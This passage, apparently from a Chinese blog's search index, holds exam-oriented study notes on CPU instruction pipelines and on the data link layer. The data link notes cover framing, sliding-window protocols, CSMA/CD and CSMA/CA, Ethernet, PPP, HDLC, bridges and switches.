由于多条指令在同一时刻争用同一资源而形成的冲突 1. 后一相关指令暂停一周期 2.资源重复配置(例如将指令和数据分别放到不同的存储器中 数据相关(数据冲突) 必须等待前一条指令执行完成后才能执行后一条指令 1. 等待若干个周期, 直到数据冲突问题消失后在执行; 分为硬件阻塞(stall)和软件插入(NOP)(插入空指令); 2.数据旁路技术(转发机制), 在结果运算出来后直接使用; 3. 编译优化:通过编译器调整指令顺序来解决数据冲突 控制相关(控制冲突) 遇到转移指令和其他改变 PC 值的指令造成断流 1.转移指令分支预测: 简单预测(永远猜转移或不转移),动态预测(根据历史情况动态调整); 2. 预取转移成功和不成功两个控制流方向上的目标指令; 3. 加快和提前形成条件码; 4.调高转移预测的准确率 流水线的分类 部件功能级,处理机级和处理机间级流水线根据流水线使用的级别进行分类 部件功能级流水线将复杂的算术逻辑运算组成流水线工作方式 例如将浮点加法操作分成求阶差, 对阶, 尾数相加,结果规格化 4 个子过程 处理机级流水线把一条指令解释过程分为多个子程序 将处理机划为多个部分 处理机间级流水线每一个处理机完成某一专门任务, 各个处理机所得到的结果存放在下一个处理机所共享的存储器中 多个处理机共同解决一个问题 单功能流水线和多功能流水线根据流水线可以完成的功能进行分类 单功能流水线只能实现一种固定的专门功能 多功能流水线通过各段间的不同连接方式可以同时或不同时地实现多种功能的流水线 动态流水线和静态流水线根据同一时间内各段之间的连接方式进行分类 静态流水线同一时间内, 流水线的各段只能按一种功能的连接方式工作 动态流水线同一时间内, 某些段在实现某种运算时, 另一些段在进行另一种运算 提高流水线的效率, 但是流水线的控制变得复杂 线性流水线和非线性流水线根据流水线的各个功能段之间是否有反馈信号进行分类 线性流水线从输入到输出, 每个功能段只允许经过一次, 不存在反馈回路 非线性流水线存在反馈回路, 从输入大输出过程中, 某些功能段将数次通过流水线 适合进行线性递归运算 流水线的多发技术 超标量技术每个时钟周期内可以并发多条独立指令(一次性执行多条指令)要配置多个功能部件(对应一次性可以执行多少条指令)不能调整指令的执行顺序通过编译优化技术, 把可以并行执行的指令搭配起来 超流水技术在一个时钟周期内在分段(时分复用)一个时钟周期内一个功能部件使用多次(每条指令在一个时钟周期片段内执行)不能调整指令的执行顺序靠编译程序优化问题 超长指令字由编译程序寻找出指令间潜在的并行性, 将多条能并行的指令组合成一条具有多个操作码字段的超长指令字采用多个处理部件 五段式指令流水线(考试题目分析) 五段式机器周期:IF(取址),ID(指令译码),EX(执行指令),M(访存阶段),WB(结果写回) 为方便流水线设计, 每个阶段的耗时一致, 以耗时最长的为准 流水线每个功能段后有一个缓存寄存器(锁存器), 作用是保存本流水线的执行结果,提供给下一流水线使用 只有当上一条指令进入 ID 段后, 下一条指令才能进入 IF 段, 否则会覆盖 IF 段锁存器的内容(以此类推) 考试中常见的指令以 RISC 指令集说明 运算类指令 ADD Rs,Rd$$(Rs)+(Rd)-&gt;Rd$$ADD #996,Rd$$ 996+(Rd)-&gt;Rd $$SHL Rd$$(Rd)&lt;&lt;&lt;2-&gt;Rd$$ IF根据 PC 从指令 Cache 取指令至 IF 段的锁存器 ID取出操作数至 ID 段锁存器 EX运算, 将结果写入 EX 段锁存器 M空段 RISC 指令集的运算类指令操作数都来自于寄存器 WB将运算结果写回指定寄存器 LOAD 指令 LOAD Rd,99(Rs)$$(996+(Rs))-&gt;Rd$$LOAD Rd,mem$$(mem)-&gt;Rd$$ IF根据 PC 从指令 Cache 取指令至 IF 段的锁存器 ID将基址寄存器的值放到锁存器 A将偏移量的值放到锁存器 EX得到有效地址 M从数据 Cache 中取数并放入锁存器 WB将取出的数写回寄存器 STORE 指令 STORE Rs,996(Rd)$$Rs-&gt;(996+(Rd))$$STORE Rs,mem$$Rs-&gt;(mem)$$ IF根据 PC 从指令 Cache 取指令至 IF 段的锁存器 ID将基址寄存器的值放到锁存器 A将偏移量的值放到锁存器将要存的数放到 B EX得到有效地址, 将锁存器 B 的内容放到锁存器 M写入数据 Cache WB空段 条件转移指令 beq Rs,Rt,#偏移量 $$若(Rs)==(Rt)\\\\则(PC)+(指令字长)+(偏移量\\times 指令字长)-&gt;PC\\\\否则(PC)+指令字长-&gt;PC$$ bne Rs,Rt,#偏移量 $$若(Rs)!=(Rt)\\\\则(PC)+(指令字长)+(偏移量\\times 指令字长)-&gt;PC\\\\否则(PC)+指令字长-&gt;PC$$ IF根据 PC 从指令 Cache 取指令至 IF 段的锁存器 ID进行比较的两个数放入锁存器 A,B偏移量放入锁存器 EX运算, 比较两个数 M将目标 PC 值写回 PC WB空段 无条件转移指令 jmp #偏移量$$(PC)+指令字长+(偏移量\\times 指令字长)-&gt;PC$$ IF根据 PC 从指令 Cache 取指令至 IF 段的锁存器 ID偏移量放入锁存器 EX将目标 PC 值写回 PC M空段 WB空段","link":"/COP-COP-5/"},{"title":"计算机网络——数据链路层","text":"计算机网络——数据链路层 目录 功能 封装成帧 组帧的方法 差错检测 差错控制 流量控制与可靠传输机制 流量控制 停止等待协议 滑动窗口协议 后退 N 帧协议（GBN） 选择重传协议（SR） 介质访问控制 静态划分信道 频分多路复用（FDM） 时分多路复用（TDM） 波分多路复用（WDM） 码分多路复用（CDM） 动态分配信道 随机访问介质访问控制 ALOHA 协议 纯 ALOHA 协议 时隙 ALOHA 协议 CSMA 协议（载波监听多路访问协议） CSMA/CD 协议（载波监听多点接入/碰撞检测协议）（重点） CSMA/CA 协议（载波监听多点接入/碰撞避免协议）（重点） CSMA/CD 与 CSMA/CA 的对比 轮询访问介质访问控制 令牌传递协议（重点） 比较 局域网基本概念和体系结构 局域网（LAN） 局域网的网络拓扑 局域网的传输介质 局域网介质访问控制方法 局域网的分类 IEEE 标准 MAC 子层和 LLC 子层 以太网（Ethrnet） BASET 以太网 以太网 MAC 帧 高速以太网 无线局域网（IEEE） 无线局域网的分类 有固定基础设施无线局域网 无固定基础设施无线局域网的自组织网络 广域网 PPP 协议 特点 PPP 协议不进行以下操作: PPP 协议的三个组成部分 PPP 协议的工作状态图 PPP 协议的帧格式 HDLC 协议 HDLC 的站 三种数据操作方式 HDLC 的帧格式 PPP 协议与 HDLC 协议比较 相同点 不同点 数据链路层的设备 网桥 交换机（多接口网桥） 考点(按重要程度排序) 流量控制和可靠传输 介质访问控制 差错检测和差错控制 字符/字节填充法 和 零比特填充法 局域网 和以太网 802.3 和无线局域网 802.11 链路层设备 注意大坑: 若题目中出现忽略其传播时延, 并且接收方需要回复确认的话, 则这个忽略其传播时延表达的意思是忽略发送时延, 实际计算还是要加上传播时延 数据链路层负责通过一条链路从一个结点向另一个物理链路直接相连的相邻结点传送数据报 结点主机, 路由器 链路网络中两个结点之间的物理通道, 由传送介质的 数据链路网络中两个结点之间的逻辑通道, 实现数据传输协议的硬件和软件 帧链路层的协议数据单元 功能在物理层的基础上向网络层提供服务将源自网络层的数据可靠的传输到相邻结点的目标机网络层主要作用是加强物理层传输原始比特流的功能, 将物理层提供可能出错的物理连接改造成逻辑上无差错的数据链路, 使之对网络层表现为一条无差错的链路 为网络层提供服务无确认无连接服务有确认无连接服务有确认面向连接服务 链路管理建立,维持,释放连接 组帧(定义数据格式) 流量控制限制发送发 差错控制 封装成帧在一段数据的前后部分添加首部和尾部,构成一个帧接收端在收到物理层的比特流后, 根据首部和尾部标记识别帧的开始和结束 首部和尾部起着帧定界的作用 帧同步接收方能重接收到的比特流区分除帧的起始和终止 组帧的方法 字符计数法帧首部使用一个计数字段(第一个字节)来标明帧内字符数(单位为字节, 包括第一个字节) 出错之后双方不能同步通信 字符(字节)填充法 在开头和结尾处添加帧开始标志和帧结束标志, 若帧的内容含有结束标志或转义标志,在改标志前添加一个字节(转义标志)来表示改字符无意义 零比特填充法 同样也有首部标识符和尾部标识符(都是01111110) 发送数据中出现5个连续的1, 则在后面添加一个0 接收数据中出现5个连续的1, 则去掉后面的一个0保证了透明传输,在传输过程中可以发送任意比特组合 违规编码法用编码方案中不会用到的方式来标明帧的开始和结束 差错检测 随机噪声 由于电路本身电器特性产生, 是信道固有,随机存在的提高信噪比减少或避免干扰(传感器) &gt;冲击噪声外界特定的影响, 产生差错的主要原因利用编码技术解决 差错控制具体原理 奇偶校验码(检错编码) 循环冗余码(检错编码)只能做到对帧的无差错接收, 凡是接收端数据链路层接收的帧均无差错 海明码(纠错码) 流量控制与可靠传输机制 流量控制接收方控制发送发的发送速度(点对点的控制), 如果接受速度小于发送速度, 则接收端不回复确认 传输层控制发送方的速度是端对端的, 且接收方向发送端一个 窗口公告 来 控制发送发速度 可靠传输发送端发送的数据与接收端接收的数据一致 流量控制控制发送速率, 使接收方有足够的缓冲空间来接收每一个帧 发送窗口发送端正在发送的数据, 一组连续的允许发送的帧的序号 接收窗口接收端接收的数据, 一组连续的允许接收帧的序号 滑动窗口解决流量控制(接收端接收速度慢则不回复确认)和可靠传输(发送方自动重传) 停止等待协议 接收窗口大小=1, 发送窗口大小=1 $$停止等待协议的信道利用率=\\frac{一个数据帧的长度}{一个数据帧的长度+2\\times RTT \\times 数据传输率}$$其中 RTT 等于 2 倍的传输时延 原理每发送一个分组后停止发送, 等待接收方回复确认后再发送下一个分组 数据帧丢失 发送方在计时器超时后没收到确认帧, 则重新发送数据包, 因此发完一个帧之后要保留该帧的副本, 收到该帧的确认帧后, 才删除副本 数据帧和确认帧需编号,解决帧的丢失和帧的重复问题接收方收到连续的编号相同的数据帧表示发送方超时重传发送方收到连续的编号相同的确认帧表示接收方收到相同的重复帧 计时器: 没发送一个帧就启动一个计时器, 时间比平均 RTT 长 数据帧出错接收方接收到的帧出错, 则直接丢弃该帧, 不回复确认, 发送方等待后超时重传 确认帧丢失接收方的确认帧丢失发送方等待后超时重传, 接收方丢弃重复帧, 并再次发送确认帧 确认帧迟到接收方的确认帧在发送方超时后才到达发送方超时重传, 接收方再次发送确认帧, 接收方对收到重复确认帧不做处理, 只取最先到达的 作用 解决比特出差错, 丢包问题 丢包指数据包丢失 实现流量控制 缺点 信道利用率太低 滑动窗口协议 发送端发送一个帧, 接收端收到一个帧后往后移动并回复一个确认收到, 发送窗口往后移动; 发送发再等待接收确认帧的同时也会将发送窗口内未发送的数据逐一发出 注意滑动窗口大小包括发送窗口和接受窗口 后退 N 帧协议(GBN) 发送窗口大小&gt;1, 接收窗口大小=1 上层的调用上层发送数据时, 发送方检查发送窗口是否已满若未满, 则产生一个帧并发送若已满, 将数据返回给上层, 表示上层已满(实际上发送方可以缓存这些数据, 待窗口不满时在发送帧) 收到确认帧对 n 号帧的确认采用累计确认的方式, 标明接收方已经接收到 n 号帧和之前的所有帧 超时事件出现超时, 发送方重传所有已发送但为确认的帧 丢失事件发送的帧丢失, 接收方有一个期待变量, 用来存放下一个收到的帧的编号, 若没有收到或收到其他非预期编号帧, 则不回复, 发送方因超时未收到确认帧, 重发 滑动窗口长度使用 n 个比特对帧编号, 则发送窗口大小 W 应满足 $1\\leq W\\leq 2^n-1$若发送窗口更大, 接收方无法区别新帧和旧帧 也就是说, 序号的 个数 不能小于 发送窗口个数+1 优点提高信道利用率 缺点有一个帧出错, 则其他正确传输正确的帧也许重传, 降低了传输效率 接收数据时, 正确收到 n 号帧,并且按序, 则回复 ACK, 并将该帧的数据部分交付给上层, 其余情况都丢弃帧, 并发送最近按序接收的帧重新发送 ACK 选择重传协议(SR) 发送窗口大小&gt;1, 接收窗口大小&gt;1 设置单个确认, 增大接收窗口, 设置接收缓存, 缓存乱序到达的帧 上层的调用从上层收到数据后, 发送方检查下一个可用于该帧的序号, 若序号位于窗口内, 则发送数据帧否则处理同 GBN 收到一个 ACK收到 ACK, 发送方将被确认的帧标记为已接受若该帧是滑动窗口中的下界(最左边的窗口对应的序号), 则将窗口向后移动到最近未被确认的窗口处;否则不滑动窗口若移动了窗口, 则发送窗口内未被发送的帧 超时事件每个帧对应一个计时器, 超时后重传该帧 滑动窗口长度$$发送窗口大小W_1+接收窗口大小W_2 \\leq 2^{n}, 其中 n 为用于帧编号的位数\\\\且W_1最好等于W_2,则, W_1=W_2=2^{n-1}$$ 接收方接收全部在接收窗口内的帧(不管是否按序), 并且回返回该帧的确认接收方收到序号更小的帧时, 会将以该序号为起点的连续的已接受的帧交付给上层, 然后移动滑动窗口接收方如果收到接收窗口外(小于窗口下届)的帧, 返回一个 ACK 介质访问控制 点对点链路: 两个相邻节点通过一个链路相连(PPP 协议, 常用于广域网)广播式链路: 所有主机共享通信媒介(常用于局域网) 静态划分信道(信道划分介质访问控制) 将使用介质的每个设备与来自同一信道上其他设备的通信隔离开, 把时域和频域资源合理分配给网络上的设备 多路复用技术: 把多个物理信号组合在一条物理信道上进行传输, 使得多个计算机或终端设备共享信道资源, 提高信道利用率(也就是把一条广播信道逻辑上分成几条用于两节点之间通信的互不干扰的子信道, 实际把广播信道转变为点对点的信道) 频分多路复用(FDM)每个用户占用一个频带, 所有用户在同时间占用不同的带宽(频率带宽, 以 Hz 为单位)资源 优点充分利用传输介质带宽, 系统效率高实现比较容易 频带: 不同频率的信号频分多路复用类似与并行, 多个用户可同时使用信道 时分多路复用(TDM)将时间划分为若干段等长的时分复用帧(TDM 帧), 每个用户占用固定序号的时间片段, 所有用户轮流占用信道 TDM 帧是在物理层传送比特流划分的帧, 标志一个周期, 一个周期内含若干个时间片段(时隙)时分多路复用类似与并发, 每个用户轮流使用信道 统计时分复用(STDM)集中器将用户要发送的数据集中后再发送 每一个 STDM 帧中的时隙数小于连接再集中器上的用户数 集中器按用户发送数据的顺序依次放入 ST DM 帧中, 一个帧满后发出 SRDM 帧是按需动态分配时隙 波分多路复用(WDM)相当于光的频分复用, 不同用户使用不同波长的光信号 码分多路复用(CDM)码分多址是码分复用的一种方式 码分多址(CDMA) 将一个比特分成多个码片/芯片(如比特1-&gt;00011011 比特0的码片序列为比特1的反码, 码片写出向量模式时, 0变成-1) 各个站点同时发送数据时, 要求各个站点的码片序列相互正交, 规格化内积为0 发送数据时, 将所有站点要发送的码片序列对应的向量相加后再发送到公共信道 分离数据时, 收到的数据与源站码片序列对应的向量规格化内积,得到1即为1, 得到-1即为0 动态分配信道 也叫动态媒体接入控制/多点接入 信道并非在用户通信时固定分配 轮询访问介质控制(令牌传递协议) 随机访问介质访问控制(必考)所有用户可随机发送信息, 发送信息时占全部带宽, 因此会产生冲突, 通过一下协议来解决冲突(采取一定的措施, 使得两节点之间的通信不会发送相互干扰的情况) 随机访问介质访问控制 ALOHA 协议 纯 ALOHA 协议比时隙 ALOHA 协议吞吐量和效率更低(这里的吞吐量指一段时间内成功发生的平均帧数) 纯 ALOHA 协议相当于想发就发, 时隙 ALOHA 协议只能再时间片段开始时才能发送 纯 ALOHA 协议不监听信道, 不按时间槽发送, 随机重发对于冲突, 则随机一段时间后在重传 $T_0$表示帧从开始发送到发送成功为止冲突指的是接收方对收到的数据检测出差错, 不发送确认, 发送方超时后,判断为冲突 时隙 ALOHA 协议把时间分成相同长的时间片, 所有用户在时间片开始时同步接入网络信道若发生冲突, 则必须等到下一个时间片开始时再发送 CSMA 协议(载波监听多路访问协议)CS(载波监听): 每个站在发送数据前要检测一下总线上时否有其他计算机在发送数据, 若检测超过一定值时, 认为有多个站在同时发送数据, 即产生了冲突MA(多点接入): 多个计算机连接在一根总线上 发送帧之前要监听信道信道空闲时, 发送完整的帧信道忙时, 推迟发送 p-坚持 CSMA 是基于时隙的操作3 种方法在发送冲突后还是要坚持把数据帧发送完 方法 信道空闲 信道忙 出现冲突 优点 缺点 1-坚持 CSMA 直接传输 一直监听,空闲时马上传输 (一段时间内没收到回复)等待一个随机时长在监听,并重发过程 只要媒体空闲,就马上发送,避免媒体利用率的损失 若有两个或以上的站点要发送数据, 则一定会发送冲突 非坚持 CSMA 直接传输 等待一个随机时间后在监听 采用随机的重发延迟时间减少冲突发送的可能性 可能存在大家都在延迟等待的过程,使媒体可能处于空闲状态,媒体利用率低 p-坚持 CSMA 有概率 p 直接传输;1-p 的概率等到下一个时间槽在发送 持续监听直到信道空闲在以概率 p 发送 等到下一时间槽再开始监听 能减少冲突和媒体空闲时间 CSMA/CD 协议(载波监听多点接入/碰撞检测协议)(重点)CS(载波监听): 每个站在发送数据前和发送数据时都要检测总线上是否有其他计算机在发送数据MA(多点接入): 多个计算机连接在一根总线上(总线型网络)CD(碰撞检测): 边发送边监听, 判断自己在发送数据时其他站是否也在发送数据(半双工网络); 若发送碰撞,则立马停止发送数据 碰撞后的重传时机 通过截断二进制指数规避算法 确定基本退避(推迟)时间为争用期 $2\\tau$ 定义 k 等于重传次数, k 不超过 10, 即 $k=min(重传次数,10)$ 当重传次数不超过 10 时, k=重传次数 当重传次数大于 10 时, k=10 从 $[0,1,…,2^k-1]$ 中随机取一个数 r, 重传所需的退避时间等于 r 倍的基本退避时间 $2r\\tau$ 重传 16 次仍不成功, 说明网络拥挤, 抛弃此帧向高层报错 最小帧长帧的传输时延至少两倍与信号在总线的传输时延$$最小帧长=总线传播时延 \\times 数据传输率 \\times 2$$ 以太网规定最短帧长为 64B CSMA/CA 协议(载波监听多点接入/碰撞避免协议)(重点)发送数据前, 检测信道是否空闲 空闲则发出 RST, RST 包括发射端地址, 接收端地址, 下一份数据将持续发送的时间等信息 信道忙则等待 接收端收到 RST 后, 响应发送 CTS(相当于双方建立了连接, 接收端拒收其他主机的 RST) 发送端收到 CTS 后, 发送数据帧(同时预约信道, 发送方告知其他站点自己还要传多久数据) 接收端收到数据帧后, 用 CRC 检验数据是否正确, 正确则相应 ACK 帧 发送端收到 ACK 帧后才能发送下一个数据帧 若没收到则一直重传至规定重发次数为止( 二进制指数退避算法 确定随机推迟的时间) 传播时延对载波监听的影响电磁波还未到达主机前, 主机一直认为总线是空闲的, 可以发送数据因此 2 倍的单程端到端传播时延 $2\\tau$ , 即最多经过 $2\\tau$ 才能知道发送的数据与别人发送冲突同时这个 $2\\tau$ 也被称为争用期,冲突窗口.碰撞窗口只要经过 $2\\tau$ 的时间没有发生碰撞, 则能肯定本次发送不会有碰撞 CSMA/CD 用于总显式以太网, CSMA/CA 用于无线局域网 协议 特点 ALOHA 协议 想发就发 CSMA 协议 先听再发 CSMA/CD 协议 先听再发, 边听边发 CSMA/CA 协议 先听再发, 先问在发 CSMA/CD 与 CSMA/CA 的对比 相同点 都属于 CSMA 思路, 先听在发 在接入信道前, 都要进行监听, 信道空闲后才能进行接入 出现冲突后都会进行有上限的重传 不同点 传输介质不同CSMA/CD 用于总线式以太网(有线)CSMA/CA 用于无线局域网(无线) 载波检测方式不同因传输介质不同CSMA/CD 通过电缆中电压的变化来检测, 数据发生碰撞时, 电缆的电压回发生变化CSMA/CA 采用能量检测(ED),载波检测(CS)和能量载波混合检测三种检测信道空闲的方式 CSMA/CS 能检测冲突CSMA/CD 是避免冲突 轮询访问介质访问控制既不产生冲突, 在发送时占有全部带宽 令牌传递协议(重点)(轮询访问介质访问控制)(轮流协议/轮转访问 MAC 协议) 主结点轮流询问从属结点是否需要发送数据, 若有结点在发送数据, 则暂停询问, 对应的其他主机也不会发送数据 令牌: 特殊的 MAC 控制帧, 不含任何信息, 用来控制信道的使用, 确保同一时间只有一个结点独占信道(无碰撞) 每一个结点可以在一定时间内(令牌持有时间)获得发送数据的权力, 但不能无限制的持有令牌常用于负载较重, 通信量较大的网络中 缺点 令牌开销 存在等待延迟 如果换中有结点出故障, 则链路错误 比较 |方式|特点||信道划分介质访问控制|1. 不会产生冲突; 2.基于多路复用技术划分资源; 3.网络负载重时, 共享信道效率高, 且公平; 4.网络负载轻时, 共享信道效率低||随机访问介质访问控制|1. 会产生冲突; 2.用户根据意愿随机发送信息, 发送信息时独占信道带宽; 3.网络负载重时, 产生冲突开销,网络负载轻时, 共享信道效率高, 单个节点可利用信道全部带宽||轮询访问介质访问控制||轮询访问介质访问控制|1. 既不产生冲突, 在发送时占有全部带宽; 2. 轮询开销; 3. 有等待延迟(需要按顺序询问, 后面的主机需要等待询问到才能发送); 4. 单点故障(主结点故障, 则网络瘫痪)| 局域网基本概念和体系结构 局域网(LAN) 在某一区域内多台计算机互联组成的计算机组 特点: 覆盖范围小, 在一个相对独立的局部范围内联 使用专门的传输介质(双绞线,同轴电缆), 数据传输率高 通信延迟时间短, 误码率低, 可靠性高 各站平等, 共享传输信道 多使用分布式控制和广播式通道, 能广播和组播 由网络拓扑,传输介质与介质访问控制方法判断是否位局域网 局域网的网络拓扑 拓扑类型 组成 优点 缺点 星型拓扑 中间结点与其他各结点相连 传输速度快, 网络结构简单, 建网容易, 便于控制和管理 网络可靠性低, 共享能力差, 有单点故障问题 总线型拓扑 多台计算机连接到一条总线上 网络可靠性高, 节点响应速度快, 共享资源能力强, 设备投入少, 成本低, 安装使用方便, 单个节点出现工作对网络影响小 环形拓扑 节点的通信链路组成一个环 设备和线路比较节省 有单点故障, 不便扩充, 系统响应延时长, 信息传输效率低 树型拓扑 所有结点按树形组成网络 易于拓展, 易于隔离故障 容易有单点故障 总线型最常用 局域网的传输介质 有线局域网双绞线, 同轴电缆, 光纤 无线局域网电磁波 局域网介质访问控制方法 CSMA/CD常用于总线型局域网, 也用于树形网络 令牌总线常用于总线型局域网, 也用于树形网络将网络中各个工作站按一定顺序排列形成一个逻辑环只有令牌的持有者才能控制总线, 拥有发送信息的权力 令牌环用于环形局域网(逻辑上的结构是环形, 实际物理结构为星型) 局域网的分类 类型 逻辑拓扑结构 物理拓扑结构 其他 以太网 总线型 星型或拓展星型 使用 CSMA/CD,应用最广泛, 包括标准以太网(10BaseT/10Mbps), 快速以太网(100Mbps), 千兆以太网(1000Mbps) 和 10G 以太网; 符合 IEEE802.3 标准 令牌环网 环形 星型 已过时 FDDI 网 环形 双拓扑 也叫光纤分布式数据接口 ATM 网 新型的单元交换技术, 使用 53 字节固定长度的单元进行交换 无线局域网(WLAN) 采用 IEEE802.11 标准 IEEE802 标准由 IEEE 802 LAN/MAN 标准委员会制定的局域网,城域网技术标准最广泛应用的有以太网, 令牌环, 无线局域网等 IEEE 802.3以太网介质访问控制协议(CSMA/CD)及物理层技术规范 IEEE 802.5令牌环网的介质访问控制协议及物理层技术规范 IEEE 802.8光纤技术咨询组 提供有关光纤联网的技术咨询 IEEE 802.11无线局域网(WLAN)的介质访问控制协议及物理层技术规范 MAC 子层和 LLC 子层IEEE 802 标准描述的局域网参考模型对应 OSI 参考模型的数据链路层和物理层将数据链路层划分为逻辑链路子层 LLC 和介质访问控制子层 MAC LLC(逻辑链路子层) 负责识别网络层协议, 然后对其封装 LLC 报头定义数据链路层收到帧时, 应当如何处理数据包 为网络层提供服务:无确认连接面向连接带确认无连接高速传送 MAC(介质访问控制子层) 数据帧的封装和卸载 帧的寻址和识别 帧的接收与发送 链路的管理 帧的差错控制 屏蔽不同物理链路种类的差异 以太网(Ethrnet)以太网(基带总线局域网规范)使用 CSMA/CD 技术 逻辑上时总线网, 物理上是星型网 优点 造价低 应用范围最广泛的局域网技术 比令牌环网, ATM 网便宜, 简单 满足网络速率要求: 10Mb/s~10Gb/s 提供无连接,不可靠服务 只实现无差错接收, 不实现可靠传输 无连接发送方和接收方之间无握手过程 不可靠不对发送方的数据帧编号接收方不向发送方进行确认差错帧直接丢弃, 差错由高层负责 DIX Ethernet V2第一个局域网产品(以太网)规约满足该规约的就可以叫以太网 IEEE 802.3IEEE 802 委员会 802.3 工作组制定的第一个 IEEE 的以太网标准 IEEE802.3 只与 DIX Ethernet V2 在帧的格式上有 2 个字节的微小不同 10BASE-T 以太网指的是传送基带信号的双绞线以太网T 表示采用双绞线10BASE-T 采用的是无屏蔽双绞线(UTP), 传输速率是 10Mb/s物理上采用星型拓扑, 逻辑上总线型每段双绞线最长100m采用曼彻斯特编码, 一个比特对应两次信号变化采用 CSMA/CD 技术 适配器 计算机与外界的局域网连接的接口 MAC 地址(物理地址/硬件地址) 在数据链路层上标识一个主机的标识符, 全球唯一共 48 位,前 24 位表示厂家, 后 24 位厂家指定 以太网 MAC 帧最常使用以太网 V2 的格式 与 IEEE802.3 的区别 第三个字段是长度/类型 长度/类型字段小于 0x0600 时, 数据字段必须装入 LLC 子层 高速以太网速度 ≥100MB/s 的以太网 100BASE-T 以太网在双绞线上传输 100Mb/s 基带信号的星型拓扑以太网使用 IEEE802.3 的 CSMA/CD支持全双工和半双工, 可在全双工工作方式下无冲突 吉比特以太网在光纤或双绞线上传送 1Gb/s 信号支持全双工和半双工, 可在全双工工作方式无冲突 10 吉比特在光纤上传送 10Gb/s 信号支持全双工, 无争用问题, 不会发生冲突 无线局域网(IEEE 802.11)覆盖范围有几千米 接收端和发送端指的是实际通信中负责接收和发生信息的基站 目的地址和源地址分别指的通信双方的 MAC 地址 无线局域网的分类 有固定基础设施无线局域网 无固定基础设施无线局域网的自组织网络 广域网跨接很大的物理范围, 所覆盖的范围从几十公里到几千公里能连接多个城市或国家, 横跨几个洲并能提供远距离通信 使用分组交换技术 通信子网利用公用分组交换网, 卫星通信网和无线分组交换, 将分布在不同地区的局域网或计算机系统互联, 达到资源共享的目的 因特网是世界范围内最大的广域网 PPP 协议 PPP 协议是在 SLIP 基础上发展而来 PPP(点对点协议)是使用最广泛的数据链路层协议, 用户使用拨号电话接入因特网时一般使用 PPP 协议只支持全双工链路 特点 简单对链路层的帧无需纠错, 无需序号, 无需流量控制 封装成帧添加帧定界符 透明传输与帧定界符一样的比特组合的数据采用:异步线路用字节填充, 同步线路用比特填充 字符(字节)填充法异步线路: 一个字节一个字节发送同步线路: 一个比特一个比特发送 多种网络层协议封装的 IP 数据包可以采用多种协议 多种类型链路串行/并行, 同步/异步, 电/光… 差错检错在帧中添加 CRC 冗余位, 检错出粗就丢弃 检错连接状态检测链路是否正常工作 最大传送单元数据部分最大长度 MTU 网络层地址协商知道双方的网络层地址 数据压缩协商将发送的数据进行压缩 PPP 协议不进行以下操作: 纠错 流量控制 为帧编号 不支持多点线路(PPP 协议只满足点对点的连接) PPP 协议的三个组成部分 将 IP 数据包封装到串行链路(同步串行/异步串行)的方法 链路控制协议 LCP建立并维护数据链路的连接(实现身份验证) 网络控制协议 NCPPPP 可支持多种网络层协议, 每种网络层协议用一个 NCP 来配置, 为网络层协议建立和配置逻辑连接 PPP 协议的工作状态图 PPP 协议的帧格式 HDLC 协议 不属于 TCP/IP 协议族 HCLD(高级数据链路控制协议)是在同步网上传输数据,面向比特的数据链路层协议, 由(ISO)根据 SDLC 协议扩展开发而成 数据报文可透明传输(用0 比特插入法, 易于硬件实现)采用全双工链路 HDLC 的站 主站发送命令(包括数据信息)帧, 接收响应帧负责对整个链路的控制系统的初始化, 流程的控制, 差错检测或恢复等 从站接收由主站发来的命令帧, 向主站发送响应帧配合主站参与差错恢复等链路控制 复合站既能发送也能接收命令帧和响应帧负责整个链路的控制 三种数据操作方式 正常响应方式从站要发送消息, 先经过主站的同意, 从站才能发送数据 异步平衡方式每个复合站都可以进行对别的站的数据传输 异步响应方式从站可以不经过主站同意就发送数据 HDLC 的帧格式 控制字段 C 信息帧(I)第 1 位为0，用来传输数据信息，或使用捎带技术对数据进行确认; 监督帧(S) 前 2 位为10，用于流量控制和差错控制，执行对信息帧的确认、请求重发和请求暂停发送等功能 无编号帧(U) 前 2 位为11，用于提供对链路的建立、拆除等多种控制功能。 PPP 协议与 HDLC 协议比较 相同点 只支持全双工链路 可以实现透明传输PPP 可以实现比特/字节填充和0 比特填充HDLC 只实现 0 比特填充 都可以实现差错检测, 但不进行差错纠正 不同点 PPP 协议面向字节HDLC 协议面向比特 PPP 协议有 2 比特协议字段HDLC 没有 PPP 协议无序号和确认机制HDLC 协议有编号和确认机制 PPP 协议不可靠HDLC 协议可靠 数据链路层的设备 冲突域 在一个冲突域中的每一个结点都能收到所有被发送的帧但是同一时间只有一台设备能发送信息 广播域 网络中能接受任一设备发出的广播帧的所有设备的集合一个设备发送广播帧, 能收到这个信号的所有设备的集合组成广播域 物理层设备(中继器, 集线器)不能隔离冲突域和广播域数据链路层设备(网桥,交换机)能隔离冲突域,不能隔离广播域网络层设备(路由器)能隔离冲突域和广播域 网桥 网桥用实现不同的网段的互联, 即网桥的两端为不同网段通过网桥连接的网络的吞吐量为每个网段的吞吐量相加 网桥根据 MAC 帧的目的地址对帧进行转发和过滤网桥收到帧后, 先检测帧的 MAC 地址, 然后确定转发到哪个接口(或者丢弃) 优点 过滤通信量, 增大吞吐量可以分割冲突域, 即每个冲突域内可以单独进行通信 扩大网络范围 提高了可靠性 可以互联不同物理层, 不同 MAC 子层和不同速率的以太网 透明网桥以太网上的站点并不知道所发送的帧将经过哪些网桥是一种即插即用的设备(通过自学习算法) 自学习网桥中有一个转发表(地址,接口)(每一个网段中都是广播发送消息)若从某个端口收到信息, 则将该信息的源 MAC 地址与对应的端口号记录到转发表收到的消息的目的 MAC 地址存在转发表中, 则将该信息转发到对应的端口(当要转发的接口与收到信息的接口不同使转发, 相同时不转发)收到的消息的目的 MAC 地址不在转发表中, 则转发到除接收信息端口的其他所有端口 源路由网桥在发送帧时, 把最详细的最佳路径(路由最少或时间最短)放在帧的首部中 实现原理: 源站用广播的方式向目的站发送一个发现帧 目的站收到发现帧(有多少条源站到目的站的路径就会收到多少各)后, 按原路返回这个发现帧, 这个发现帧记录这由源站到目的站的路由数量和所花时间 目的站返回每个发现帧对应一种方案, 由源站选择路由最少或时间最短的方案来作为之后的传输路径 交换机(多接口网桥)每一个端口对应的网络就是一个冲突域可以独占传输媒体的带宽(每一个端口对应的网络带宽就是交换机传输媒体的带宽) 直通式交换机检查完目的地址(6B)就立刻转发延迟小, 可靠性低, 无法支持具有不同速率的端口的交换 存储转发式交换机将帧放入高速缓存, 并检查是否正确, 正确则转发, 否则丢弃延迟大, 可靠性高, 